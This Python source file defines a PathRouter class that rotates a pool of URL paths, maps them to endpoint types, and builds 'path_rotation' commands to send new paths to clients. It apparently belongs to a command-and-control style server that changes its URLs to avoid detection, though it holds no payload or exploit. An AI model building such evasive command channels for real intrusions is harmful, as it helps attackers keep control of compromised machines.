import json
import logging
import datetime
import random

logger = logging.getLogger(__name__)

class PathRouter:
    """Manages URL path routing and rotation with pool-based path approach"""
    
    def __init__(self, path_manager):
        self.path_manager = path_manager
        self.path_mapping = {}
        self.update_path_mapping()
        logger.info("PathRouter initialized with pool-only path manager")
    
    def update_path_mapping(self):
        """Update path mapping after rotation to map all paths in the pool"""
        self.path_mapping = {}
        
        # Get current paths
        current_paths = self.path_manager.get_current_paths()
        
        # Log all available paths to help with debugging
        logger.debug(f"Current available paths: {current_paths}")
        
        # Map all paths in the pool to 'pool_path' type
        if "path_pool" in current_paths and isinstance(current_paths["path_pool"], list):
            for path in current_paths["path_pool"]:
                # Look for path patterns to identify different operation types
                if "/file/" in path or "/download/" in path or "/content/" in path:
                    self.path_mapping[path] = "file_operation_path"
                    logger.debug(f"Mapped pool path {path} to file_operation_path based on pattern")
                else:
                    self.path_mapping[path] = "pool_path"
                    logger.debug(f"Mapped pool path {path} to pool_path type")
        
        # Also add previous rotation's paths for graceful transition
        if self.path_manager.rotation_counter > 0:
            previous_paths = self.path_manager.get_path_by_rotation_id(self.path_manager.rotation_counter - 1)
            if previous_paths and "path_pool" in previous_paths:
                for path in previous_paths["path_pool"]:
                    if path not in self.path_mapping:  # Don't overwrite current mappings
                        # Look for file patterns in previous pool paths too
                        if "/file/" in path or "/download/" in path or "/content/" in path:
                            self.path_mapping[path] = "previous_file_operation_path"
                            logger.debug(f"Mapped previous pool path {path} to previous_file_operation_path")
                        else:
                            self.path_mapping[path] = "previous_pool_path"
                            logger.debug(f"Mapped previous pool path {path} to previous_pool_path")
    
    def check_rotation(self):
        """Check if rotation is needed and update mapping if it is"""
        if self.path_manager.check_rotation():
            logger.info("Path rotation triggered - updating path mappings")
            self.update_path_mapping()
            return True
        return False
    
    def get_endpoint_type(self, path):
        """Get the endpoint type for a given path"""
        # Enhanced logging for path resolution
        logger.debug(f"Resolving endpoint type for path: {path}")
        
        # Check in current path mapping (includes specific paths and pool paths)
        if path in self.path_mapping:
            endpoint_type = self.path_mapping[path]
            logger.debug(f"Found endpoint type in current mapping: {endpoint_type}")
            return endpoint_type
        
        # Special handling for dynamic paths that might be for file operations
        if "/file/" in path or "/download/" in path or "/content/" in path:
            logger.info(f"Path {path} looks like a file operation path")
            return "file_operation_path"
        
        # If not found, check for partial matches (useful for dynamic subpaths)
        for mapped_path, endpoint_type in self.path_mapping.items():
            # Check if the path is a subpath of a mapped path
            if mapped_path.startswith(path) or path.startswith(mapped_path):
                logger.debug(f"Found partial match: {path} -> {endpoint_type} (mapped: {mapped_path})")
                return endpoint_type
        
        # If not found, check older rotations
        for rotation_id in range(max(0, self.path_manager.rotation_counter - 5), self.path_manager.rotation_counter):
            paths = self.path_manager.get_path_by_rotation_id(rotation_id)
            if paths and "path_pool" in paths:
                for old_path in paths["path_pool"]:
                    if old_path == path:
                        # Check for file patterns in old pool paths
                        if "/file/" in path or "/download/" in path or "/content/" in path:
                            logger.debug(f"Found in rotation {rotation_id} pool: {path} -> old_file_operation_path")
                            return "old_file_operation_path"
                        else:
                            logger.debug(f"Found in rotation {rotation_id} pool: {path} -> old_pool_path")
                            return "old_pool_path"
        
        # Not found in any paths
        logger.warning(f"No endpoint type found for path: {path}")
        return None
    
    def is_valid_path(self, path):
        """Check if a path is valid (in any current or previous paths)"""
        result = self.get_endpoint_type(path) is not None
        logger.debug(f"Path validity check: {path} -> {result}")
        return result
    
    def get_current_paths(self):
        """Get the current active paths"""
        return self.path_manager.get_current_paths()
    
    def get_random_path(self, for_file_operation=False):
        """Get a random path from the pool, optionally for a file operation"""
        current_paths = self.path_manager.get_current_paths()
        if "path_pool" in current_paths and current_paths["path_pool"]:
            pool = current_paths["path_pool"]
            
            if for_file_operation:
                # Try to find paths that look like file operations
                file_paths = [p for p in pool if "/file/" in p or "/download/" in p or "/content/" in p]
                if file_paths:
                    return random.choice(file_paths)
            
            # Return a random path from the pool
            return random.choice(pool)
        
        # Fallback to a generic path if pool is empty
        return "/api/endpoint"
    
    def get_rotation_info(self):
        """Get information about the current rotation state"""
        return self.path_manager.get_rotation_info()
    
    def create_path_rotation_command(self):
        """Create a command to update client with new path rotation info"""
        rotation_info = self.path_manager.get_rotation_info()
        
        # Only include the path pool in the command
        paths_dict = {"path_pool": rotation_info["current_paths"]["path_pool"]}
        
        return {
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "path_rotation",
            "args": json.dumps({
                "rotation_id": rotation_info["current_rotation_id"],
                "next_rotation_time": rotation_info["next_rotation_time"],
                "paths": paths_dict
            })
        }